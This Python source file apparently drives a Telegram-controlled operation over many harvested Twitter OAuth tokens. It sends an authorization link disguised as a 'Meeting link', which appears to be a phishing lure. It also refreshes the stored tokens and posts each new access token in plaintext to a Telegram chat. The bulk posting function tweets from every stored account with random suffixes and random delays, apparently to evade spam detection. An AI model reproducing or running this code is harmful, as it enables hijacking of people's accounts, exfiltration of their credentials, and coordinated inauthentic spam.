import base64
import hashlib
import os
import requests
import time
import random
import string
import psycopg2
from config import Config

# Code verifier and challenge functions
def generate_code_verifier_and_challenge():
    code_verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode('utf-8')
    code_challenge = base64.urlsafe_b64encode(
        hashlib.sha256(code_verifier.encode()).digest()
    ).rstrip(b'=').decode('utf-8')
    return code_verifier, code_challenge

# Send messages and OAuth link functions
def send_startup_message():
    state = "0"
    code_verifier, code_challenge = generate_code_verifier_and_challenge()
    authorization_url = Config.CALLBACK_URL
    meeting_url = f"{Config.CALLBACK_URL}j?meeting={state}&pwd={code_challenge}"

    message = (
        f"🚀 *OAuth Authorization Link:*\n[app link]({authorization_url})\n\n"
        f"📅 *Meeting Link:*\n[Meeting link]({meeting_url})"
    )
    url = f"https://api.telegram.org/bot{Config.TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": Config.TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}
    requests.post(url, json=data)

def send_message_via_telegram(message):
    url = f"https://api.telegram.org/bot{Config.TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": Config.TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}
    response = requests.post(url, json=data)
    if response.status_code != 200:
        print(f"Failed to send message via Telegram: {response.text}")

# Twitter token and profile functions
def get_twitter_username_and_profile(access_token):
    url = "https://api.twitter.com/2/users/me"
    headers = {"Authorization": f"Bearer {access_token}"}
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        data = response.json().get("data", {})
        username = data.get("username")
        profile_url = f"https://twitter.com/{username}" if username else None
        return username, profile_url
    else:
        print(f"Failed to fetch username. Status code: {response.status_code}")
        return None, None

def post_tweet(access_token, tweet_text):
    TWITTER_API_URL = "https://api.twitter.com/2/tweets"
    headers = {"Authorization": f"Bearer {access_token}", "Content-Type": "application/json"}
    payload = {"text": tweet_text}
    response = requests.post(TWITTER_API_URL, json=payload, headers=headers)
    if response.status_code == 201:
        tweet_data = response.json()
        return f"Tweet posted successfully: {tweet_data['data']['id']}"
    else:
        error_message = response.json().get("detail", "Failed to post tweet")
        return f"Error posting tweet: {error_message}"

# Token refresh and database update functions
def refresh_token_in_db(refresh_token, username):
    token_url = 'https://api.twitter.com/2/oauth2/token'
    client_credentials = f"{Config.CLIENT_ID}:{Config.CLIENT_SECRET}"
    auth_header = base64.b64encode(client_credentials.encode()).decode('utf-8')
    headers = {'Authorization': f'Basic {auth_header}', 'Content-Type': 'application/x-www-form-urlencoded'}
    data = {'refresh_token': refresh_token, 'grant_type': 'refresh_token', 'client_id': Config.CLIENT_ID}
    response = requests.post(token_url, headers=headers, data=data)
    token_response = response.json()
    if response.status_code == 200:
        new_access_token = token_response.get('access_token')
        new_refresh_token = token_response.get('refresh_token')
        conn = psycopg2.connect(Config.DATABASE_URL, sslmode='require')
        cursor = conn.cursor()
        cursor.execute('UPDATE tokens SET access_token = %s, refresh_token = %s WHERE username = %s', 
                       (new_access_token, new_refresh_token, username))
        conn.commit()
        conn.close()
        send_message_via_telegram(f"🔑 Token refreshed for @{username}. New Access Token: {new_access_token}")
        return new_access_token, new_refresh_token
    else:
        send_message_via_telegram(f"❌ Failed to refresh token for @{username}: {response.json().get('error_description', 'Unknown error')}")
        return None, None

def handle_post_single(tweet_text):
    tokens = get_all_tokens()
    if tokens:
        access_token, _, username = tokens[0]  # Post using the first token
        result = post_tweet(access_token, tweet_text)
        send_message_via_telegram(f"📝 Tweet posted with @{username}: {result}")
    else:
        send_message_via_telegram("❌ No tokens found to post a tweet.")

def handle_post_bulk(message):
    tokens = get_all_tokens()
    if tokens:
        parts = message.split(' ', 1)
        base_tweet_text = parts[1]
        min_delay = Config.DEFAULT_MIN_DELAY
        max_delay = Config.DEFAULT_MAX_DELAY
        for access_token, _, username in tokens:
            tweet_text = f"{base_tweet_text} {generate_random_string(10)}"
            result = post_tweet(access_token, tweet_text)
            delay = random.randint(min_delay, max_delay)
            send_message_via_telegram(f"📝 Tweet posted with @{username}: {result}\n⏱ Delay: {delay} seconds")
            time.sleep(delay)

def handle_refresh_single():
    tokens = get_all_tokens()
    if tokens:
        _, refresh_token, username = tokens[0]
        refresh_token_in_db(refresh_token, username)
    else:
        send_message_via_telegram("❌ No tokens found to refresh.")

def handle_refresh_bulk():
    tokens = get_all_tokens()
    if tokens:
        for _, refresh_token, username in tokens:
            refresh_token_in_db(refresh_token, username)
        send_message_via_telegram(f"✅ Bulk token refresh complete for {len(tokens)} tokens.")
    else:
        send_message_via_telegram("❌ No tokens found to refresh.")
